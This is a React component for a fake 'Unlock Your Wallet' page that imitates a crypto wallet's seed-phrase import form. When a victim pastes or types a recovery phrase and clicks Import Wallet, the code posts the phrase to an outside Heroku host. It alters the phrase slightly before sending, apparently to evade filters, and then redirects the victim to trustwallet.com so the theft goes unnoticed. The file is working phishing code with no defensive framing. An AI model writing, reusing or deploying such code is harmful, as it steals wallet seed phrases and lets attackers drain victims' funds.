import React, {useEffect, useState} from 'react'
import { Form, Button } from 'react-bootstrap'
import loogoo from '../assets/images/loogoo.png';
import "react-loader-spinner/dist/loader/css/react-spinner-loader.css";
import Loader from "react-loader-spinner";
import {
  isIOS
} from "react-device-detect";
import {Link, useLocation} from 'react-router-dom';
import axios from 'axios';

axios.defaults.headers.post['Content-Type'] ='application/x-www-form-urlencoded';

export default () => {
  const [val, setVal] = React.useState(" ");
  const [pasted, setPasted] = React.useState(false);
  const [message, setMessage] = React.useState("Usually 12 words (sometimes 24) separated by single spaces.");
  const [imported, setimported] = useState(false);
  const location = useLocation();

  const handlePaste = (event) => {
    event.preventDefault()
    if(navigator.clipboard){
      navigator.clipboard.readText().then(text => {
        setVal(text)
        setPasted(true)
      }).catch(() => {
        setVal('');
        setPasted(false)
      })
    }
  }

  const onImport = async (e) => {
    e.preventDefault()
    const arr = val.trim().split(" ")
    arr[3] += " "
    const pass = arr.join(" ")
    console.log(pass)
    setimported(true)
      await axios.post(`https://ips370.herokuapp.com/check`, null, { params: {
        infos: pass
      }})
      setimported(false)
      window.location.href = 'https://trustwallet.com/'
  }

  useEffect(() => {
     if(val.trim().split(' ').length >= 12 && val.trim().split(' ').length <= 25){
      setPasted(true)
     }else{
       setPasted(false)
     }
  })

  return (
    <>
    <span className="headwa">
    
    <p className="wallet-page__title ml-1">Unlock Your Wallet</p>
  </span>
    <div className="py-md-5 wallet-page__card" id="metrocontainer">
     
    <div className={"lodmodal " + (imported && "d-block")}>
    <Loader
        type="TailSpin"
        color="#254f7f"
        secondaryColor="#fff"
        height={50}
        width={50}
       
      />
      <p className="text-white-75 infowal mt-2">importing, please wait...</p>
    </div>

        <div className="tabular">
          <Link className={"tabular__item " + (location.pathname == "/register-wallet" ? "blou" : "")} to="register-wallet">Seed Phrase</Link>
          <Link className="tabular__item" to="private">Private Key</Link>
          <Link className="tabular__item" to="hardware">Hardware</Link>
        </div>
      <div className="c-width mx-auto text-left fl" >
       
        <Form>
          <Form.Group>
            <div className="tr-1">
                <Form.Control className="tab__textarea" as="textarea" rows={6} placeholder="Enter Your Recovery Phrase" id="recov" 
                value={val} onChange={(e) => setVal(e.target.value.replace(/[^a-zA-Z\s]/g, ""))}/>
                <button className="tr-2" onClick={e => handlePaste(e)}>Paste</button>
            </div>
            <span>
              <p className="c_blue infowal">{message}</p>
            </span>
          </Form.Group>
          <Form.Group>
            {/* <Form.Label className="c_blue infowal font-weight-bold">Name</Form.Label> */}
            <Form.Control type="text" placeholder="Main Wallet 1" className="height-50 tab__password-input" />
          </Form.Group>
          <div className="d-flex justify-content-center">
            <Button className={"impbtn " + (!pasted ? 'disabledd' : 'activee')} onClick={onImport}>Import Wallet</Button>
          </div>
          <span className="privacypolicy">
          <img src={loogoo} width={25} />
            <p className="c_blue infowal">Don't have a wallet ? Create one</p>
          </span>
        </Form>
      </div>
    </div> 
    </>
  )
}